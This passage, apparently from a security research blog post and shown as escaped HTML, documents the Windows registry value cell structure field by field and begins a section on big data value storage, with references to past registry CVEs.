 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x002&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;NameLength&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;DataLength&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Data&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x012&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Spare&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x014&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[1]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Wchar&lt;/span&gt;&lt;/p&gt;
 &lt;br/&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Let&amp;#39;s examine each field more closely.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.ig8smlupo50p&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Signature&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;It identifies the cell as a key value, and must be equal to 0x6B76 (&amp;#39;vk&amp;#39;). It is verified during hive load, but isn&amp;#39;t used for anything else later on.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.6xxe04et4aif&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;NameLength and Name&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The combination of these two fields specifies the name of the value: NameLength indicates the length of the string in bytes, and Name is an inline, variable-length buffer that stores the name itself. Let&amp;#39;s consider the same criteria of the name that we have previously discussed in the context of registry keys:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_30z58zep11nd-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Compression:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;Similarly to keys, value names may be compressed if the VALUE_COMP_NAME (0x1) flag is set in _CM_KEY_VALUE.Flags. In that case, the string is stored as 8-bit ASCII characters, otherwise the normal wide-character encoding is used.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Length:&lt;/span&gt;&lt;span&gt;&amp;nbsp;The length of the name can be between 0 and &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits&quot;&gt;16,383&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;characters. A length of zero indicates an alias for the value displayed by Regedit as &amp;quot;(Default)&amp;quot;, a remnant of the design from Windows 3.1 where data was assigned directly to keys. As a sidenote, the correct enforcement of the upper limit was only introduced in October 2022 as a fix for &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451478&quot;&gt;CVE-2022-37991&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Charset:&lt;/span&gt;&lt;span&gt;&amp;nbsp;All characters in the 0x0000 &amp;ndash; 0xFFFF range are allowed in a value name, with no exceptions. Since values are not part of the same namespace as keys, this even includes backslashes. The only constraint is that if the corresponding key is a symbolic link, then the value must be named &amp;quot;SymbolicLinkValue&amp;quot;, as it has a special meaning and stores the link&amp;#39;s target path. An example of a bug related to sanitizing value names was &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/02_SymbolicLinkValue_OOB_read&quot;&gt;CVE-2024-26176&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Uniqueness:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;Value name uniqueness is not enforced on input, but it is maintained by the kernel at runtime on a best-effort basis. That means that whenever setting a value, the system will always try to reuse an existing one with the same name before creating a new one. Similarly to keys, value lookup is performed in a case-insensitive manner, but the original casing is preserved and visible to the clients.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.ykcjw0toop99&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;DataLength&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Specifies the length of the data stored in the value. The various ranges of the 32-bit space that the field can fall into are explained below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;MvcjwGOuIU-c28&quot;&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;DataLength&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c66 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Hive versions &amp;lt; 1.4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c25 MvcjwGOuIU-c64&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;Hive versions &amp;ge; 1.4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c48&quot; colspan=&quot;2&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Empty value, `Data` must be set to HCELL_NIL.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x1 &amp;ndash; 0x3FD8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c48&quot; colspan=&quot;2&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Data stored directly in a backing cell pointed to by `Data`.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x3FD9 &amp;ndash; 0xFFFFC&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c59 MvcjwGOuIU-c66&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Data stored directly in a backing cell pointed to by `Data`.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c25 MvcjwGOuIU-c59&quot; colspan=&quot;1&quot; rowspan=&quot;2&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Data split into 16344-byte chunks and saved in a &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;big data&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;object pointed to by `Data`.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0xFFFFD &amp;ndash; 0x3FD7C028&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c66 MvcjwGOuIU-c53&quot; colspan=&quot;1&quot; rowspan=&quot;2&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Invalid.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x3FD7C029 &amp;ndash; 0x7FFFF000&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c25 MvcjwGOuIU-c78&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Not accepted on input due to a 16-bit integer overflow in &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow&quot;&gt;the &lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow&quot;&gt;big data chunk count&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. Feasible to set at runtime, but the saved data will be truncated due to the same bug / design limitation.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x7FFFF001 &amp;ndash; 0x7FFFFFFF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c77&quot; colspan=&quot;2&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Invalid&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x80000000 &amp;ndash; 0x80000004&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c48&quot; colspan=&quot;2&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span&gt;Between 0&amp;ndash;4 bytes stored &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;inline in the `Data` field.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c45&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c46&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;0x80000005 &amp;ndash; 0xFFFFFFFF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c77 MvcjwGOuIU-c53&quot; colspan=&quot;2&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Invalid.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.kbn4sli8fhs4&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Data&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Responsible for storing or pointing to the data associated with the value. To summarize the table above, it can be in one or four states, depending on the data length and hive version:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_s5xocqmkj8s9-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Empty&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;&amp;ndash; equal to HCELL_NIL, if DataLength is 0.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Inline&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;&amp;ndash; stores up to four bytes in the Data member of the value cell itself, as indicated by DataLength &amp;amp; 0x7FFFFFFF, if the highest bit of DataLength is set. As a side effect, an empty value can be represented in two ways: either as DataLength=0 or DataLength=0x80000000.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Raw data&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;&amp;ndash; points to a raw backing cell if Hive.Version &amp;lt; 1.4 or DataLength &amp;le; 0x3FD8.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Big data&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ndash; points to a big data structure introduced in hive version 1.4, which is capable of storing 0xFFFF &amp;times; 0x3FD8 = 0x3FD7C028 bytes (a little under 1 GiB). More on big data cells in the section below.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.a7cz3askjvhz&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Type&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;This field is supposed to store one of the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types&quot;&gt;supported value types&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, such as REG_DWORD, REG_BINARY, etc. We&amp;#39;ll omit a thorough discussion of the official types, as we feel they are already well documented and understood. From a strictly technical point of view, though, it&amp;#39;s important to note that the type is simply a hint, an extra piece of metadata that is available to a registry client with the intended purpose of indicating the nature of the value. However, Windows provides no guarantees with regards to the consistency between the value type and its data. For instance, a REG_DWORD value doesn&amp;#39;t have to be four-bytes long (even though it conventionally is), a REG_SZ unicode string can have an odd length, and so on. Any client application that operates on user-controlled data from the registry should always check the specific properties it relies on, instead of unconditionally trusting the value type.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Beyond this flexibility in data interpretation, there&amp;#39;s another aspect of the Type field to consider: its potential for misuse due to its 32-bit width. The kernel generally doesn&amp;#39;t perform any verification that its numerical value is one of the small, predefined enums (other than to ensure REG_LINK for symbolic links and REG_NONE for tombstone values), so it is possible to set it to any arbitrary 32-bit value, and have it returned in exactly the same form by system APIs such as &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw&quot;&gt;RegQueryValueEx&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. If a program or driver happens to use the value type returned by the system as a direct index into an array without any prior bounds checking, this could lead to out-of-bounds reads or memory corruption. In some sense, it would probably be safest for the most critical/privileged software in the system (e.g. antivirus engines) not to use the value type at all, or only within a very limited scope.&lt;/span&gt;&lt;/p&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.57g7ripdeb6h&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Flags&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;There are currently two supported flags that can be set on registry values:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_gsnrn3gksa0-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;VALUE_COMP_NAME (0x1) &amp;ndash; equivalent to KEY_COMP_NAME, indicates that the value name representation is a tightly packed string of ASCII characters.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;VALUE_TOMBSTONE (0x2) &amp;ndash; used exclusively in differencing hives (version 1.6) to indicate that a value with the given name has been explicitly deleted and doesn&amp;#39;t exist on this key layer. It requires that the value type is REG_NONE and it doesn&amp;#39;t contain any data. It is equivalent to the Tombstone (1) property of a key set in the LayerSemantics field of a key node.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h6 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.4d7kkqnufxf0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c10&quot;&gt;Spare&lt;/span&gt;&lt;/h6&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Unused member, never accessed by the kernel.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;MvcjwGOuIU-c6&quot; id=&quot;h.80v5kzs0iedx&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c31 MvcjwGOuIU-c36&quot;&gt;Big data value storage&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Prior to hive version 1.4, the maximum length of a value in the registry was 1 MB, which was directly related to the maximum length of the single backing cell that would store the raw data. This limitation is documented in the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits&quot;&gt;Registry element size limits&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;article:&lt;/span&gt;&lt;/p&gt;
